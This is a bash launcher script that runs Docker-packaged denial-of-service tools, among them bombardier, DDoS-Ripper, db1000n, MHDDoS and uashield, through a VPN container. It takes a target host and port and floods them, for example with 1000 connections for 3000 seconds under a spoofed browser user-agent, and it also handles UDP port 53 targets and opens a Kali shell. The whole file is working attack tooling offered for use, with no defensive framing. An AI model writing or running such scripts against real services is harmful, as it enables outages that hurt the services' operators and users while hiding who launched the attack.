#!/bin/bash

BASEDIR=$(dirname "$0")
cd $BASEDIR

initTarget(){
    export TARGET_PORT=$2
    export R_TARGET_URL=$1
    export RUN_RIPPER=1
    scheme="http://"
    updSuffix=""
    if [ "$TARGET_PORT" -eq "443" ]
    then
        scheme="https://"
    fi
    if [ "$TARGET_PORT" -eq "53" ]
    then
        RUN_RIPPER=0
        scheme=""
        updSuffix="/UDP"
    fi
    export B_TARGET_URL="$scheme$R_TARGET_URL:$TARGET_PORT$updSuffix"
    echo "R_TARGET_URL=$R_TARGET_URL,B_TARGET_URL=$B_TARGET_URL"
    sudo git reset --hard
    sudo git pull
}
compose(){
    . ./settings.sh
    sudo -E docker-compose "$@"
}
start_vpn() {
    . ./settings.sh
    sudo -E docker-compose down
    sudo -E docker-compose up -d --force-recreate vpn refresher
    sleep 10s
    sudo docker-compose logs
    sudo -E docker-compose run --rm test
}
test_vpn(){
    start_vpn
    sudo -E docker-compose down
}
status(){
    while true
    do
        screen -ls
        echo "Last logs on $(date):"
        tail -n 10 "./tool.log"
        sleep 30s
    done
}
run(){
    . ./settings.sh
    tool=$1
    start_vpn
    sudo rm -f "tool.log"
    echo "Running: sudo -E docker-compose run $tool $2"
    screen -dm -S tool -L -Logfile "tool.log" sudo -E docker-compose run $tool $2
    status
}
uashield() {
    run "uashield"
}
bombardier()
{
    initTarget $1 $2
    run "bombardier" "-k -H \"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36\" -c 1000 -d 3000s -l ${B_TARGET_URL}"
}
ddosripper()
{
    initTarget $1 $2
    run "ddosripper" "$R_TARGET_URL $TARGET_PORT"
}
checksites(){
    compose pull checksites
    run "checksites"
}
db1000n(){
    compose pull db1000n
    run "db1000n" "30 10000"
}
ddoser(){
    compose pull ddoser
    sudo rm -f "tool.log"
    screen -dm -S tool -L -Logfile "tool.log" sudo -E docker-compose up ddoser
    status
}
mhddos(){
    run "mhddos" "$@"
}
build(){
    compose build $1
}
kali(){
    start_vpn
    sudo docker run --net=container:runner_vpn_1 -ti --rm local/kali bash
}
cls(){
    sudo docker container ls
}
stop(){
    sudo docker-compose down
}
crm(){
    sudo docker container rm $1
}
upd(){
    sudo -sE git pull
}
"$@"